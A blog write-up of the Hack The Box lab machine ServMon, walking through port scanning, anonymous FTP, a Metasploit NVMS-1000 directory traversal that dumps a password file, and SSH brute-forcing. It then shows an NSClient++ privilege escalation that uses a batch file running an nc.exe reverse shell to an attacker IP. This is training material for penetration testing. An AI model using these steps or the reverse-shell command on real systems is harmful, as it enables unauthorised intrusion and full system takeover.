---
layout: single
title: "Hack The Box Write-up #2 : ServMon"
excerpt: "My walkthrough of ServMon Machine from HackTheBox"
date: 2020-06-20
toc: true
toc_sticky: true
header:
  teaser: /assets/images/servmon-walkthrough/servmon.PNG
  teaser_home_page: true
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - cve
---

![Card](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/servmon-walkthrough/servmon.PNG)

## Enumeration

### nmap
As always I started by firing up a nmap scan against the host and came up with the following results : 

```
root@kali:~# nmap -sC -sV -v -p- 10.10.10.184
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo:
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     refo
|_    2-contai
| http-methods:
|_  Supported Methods: GET
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4
|_SHA-1: 7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
```

There seem to be a few holes that could get me inside the machine , but the most suspicious of them where I could gather a little more information for free , seems that allowed `anonymous login` on the ftp server.

### ftp
After logging in by making use of the anonymous ftp login I was presented with the users folder (Nathan and Nadine) , with both of them having a note saved in text files in their folders : ``Confidental.txt`` and ``Notes to do.txt`` with the following content :

- Confidental.txt

**Nathan,
I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
Regards, 
Nadine**

- Notes to do.txt

**1) Change the password for NVMS - Complete**
**2) Lock down the NSClient Access - Complete**
**3) Upload the passwords**
**4) Remove public access to NVMS**
**5) Place the secret files in SharePoint**

There seems to be an useful information for some passwords stored on Nathan Desktop folder which we should keep in mind.

### Web

After gathering enough initial information it's safe to take a look on the webpage which represents a simple login page :

![web](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/servmon-walkthrough/web-servmon.png)

The webpage seems like an administration panel for a CCTV system so for the sake of simplicity I decided to search for ``NVMS-1000`` on msf to see if there was any ready made exploit that I could make use of. (not useful for OSCP tho) 

```console
msf5 > search nvms

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal
```

## User Escalation

The dots starting to connect!
I came up with a directory traversal exploit for the following NVMS version that could help me grab the previously mentioned ``Passwords.txt`` from Nathan's desktop folder.

### metasploit

We move on by setting the needed options to the metasploit module and giving it a go : 

```console
msf5 > use auxiliary/scanner/http/tvt_nvms_traversal
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set rhosts servmon.htb
rhosts => servmon.htb
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set filepath /users/nathan/desktop/passwords.txt
filepath => /users/nathan/desktop/passwords.txt
```

And we try to run it : 

```console
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > run

[+] 10.10.10.184:80 - Downloaded 156 bytes
[+] File saved in: /root/.msf4/loot/20200418090637_default_10.10.10.184_nvms.traversal_531779.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/tvt_nvms_traversal) >exit

root@kali:~# cat /root/.msf4/loot/20200418090637_default_10.10.10.184_nvms.traversal_531779.txt
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

The exploit was succesful and I was able to dump a collection of possible passwords I could use against SSH protocol with the usernames I have.

``nadine:L1k3B1gBut7s@W0rk`` were the valid creds from the bruteforcing and with that working up , I am able to grab the user flag and move on to root.

### ssh

```
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt
*redacted flag*
```

## Root Escalation

As usual I started taking a look on the softwares installed on the machine to see if I could make use of any.

```
nadine@SERVMON C:\>dir "Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Program Files

08/04/2020  23:21    <DIR>          .
08/04/2020  23:21    <DIR>          ..
08/04/2020  23:21    <DIR>          Common Files
08/04/2020  23:18    <DIR>          Internet Explorer
19/03/2019  05:52    <DIR>          ModifiableWindowsApps
16/01/2020  19:11    <DIR>          NSClient++
08/04/2020  23:09    <DIR>          Reference Assemblies
08/04/2020  23:21    <DIR>          UNP
14/01/2020  09:14    <DIR>          VMware
08/04/2020  22:31    <DIR>          Windows Defender
08/04/2020  22:45    <DIR>          Windows Defender Advanced Threat Protection
19/03/2019  05:52    <DIR>          Windows Mail
19/03/2019  12:43    <DIR>          Windows Multimedia Platform
19/03/2019  06:02    <DIR>          Windows NT
19/03/2019  12:43    <DIR>          Windows Photo Viewer
19/03/2019  12:43    <DIR>          Windows Portable Devices
19/03/2019  05:52    <DIR>          Windows Security
19/03/2019  05:52    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              18 Dir(s)  27,852,365,824 bytes free
```

``NSClient`` seems interesting so I started googling about it and came up with an easy step-by-step I found in [exploitdb](https://www.exploit-db.com/exploits/46802)

### NSClient Exploitation

We start by exploring and gathering the informations we need in order to make the exploit work.

- Grab web administrator password :

```
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:        
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help
                                                
; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
...
```

After grabbing the web administrator it seems obvious that there is also a config set so only localhost addresses are able to access the web administration page running on port 8443 so I logged out from the SSH client and reconnected by setting up a tunnel to 8443 to replicate the connection to my localhost.

```
root@kali:~# ssh -L 8443:127.0.0.1:8443 nadine@servmon.htb
nadine@servmon.htb''s password:                                                   
Microsoft Windows [Version 10.0.18363.752]                                  
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

I can now navigate to https://localhost:8443/ :

![panel](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/servmon-walkthrough/panel.png)

We can use the password from the config file we found earlier and move on to the next step of the exploitation.

- Download nc.exe and evil.bat to c:\temp from attacking machine
``@echo off  c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe``
  
I made a file named pi.bat in my kali with the lines suggested from the exploit steps and uploaded it alongside with nc.exe in ``C:\Temp\`` of the machine.

- Add script foobar to call evil.bat and save settings

Next thing , I am going to add a new script in the application named ``whatever u want`` which calls the script I saved in `C:\Temp`

![evil](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/servmon-walkthrough/evil-servmon.png)

### root-shell

As seen above I named my newly added script as `command` and now I can send this command to the console and expect a reverse shell as system.

```
root@kali:~# nc -lvnp 9001
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:52351.
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
nt authority\system
```

After executing the command to the web console , I succesfully got a shell as ``nt authority\system`` as expected.
With that we came to the final sentence for this blog and I am able to grab the root flag by navigating to administrator desktop :

```
C:\Program Files\NSClient++>type C:\Users\Administrator\Desktop\root.txt
*redacted flag*
```
